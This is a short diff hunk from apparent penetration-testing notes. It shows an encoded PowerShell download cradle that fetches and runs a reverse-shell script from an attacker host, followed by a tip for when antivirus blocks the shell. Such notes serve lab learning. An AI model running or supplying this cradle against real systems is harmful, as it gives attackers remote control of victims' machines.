@@ -98,7 +98,7 @@ The reaseon we are converting to utf-16le is for Windows compability.
 
 And finally we powershell the base64 string in the remote host:
 
-	poweshell -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAOgA4ADAAMAAwAC8AcgBlAHYAXwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA=
+	poweshell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADYAOgA4ADAAMAAwAC8AcgBlAHYAXwBzAGgAZQBsAGwALgBwAHMAMQAnACkACgA=
 
 If we get a hit on the webserver trying to download the shell, but don't get the shell on the nc we know that the web cradle is working but the antivirus is blocking the rev shell. If this happens try changing the cradle to:
 
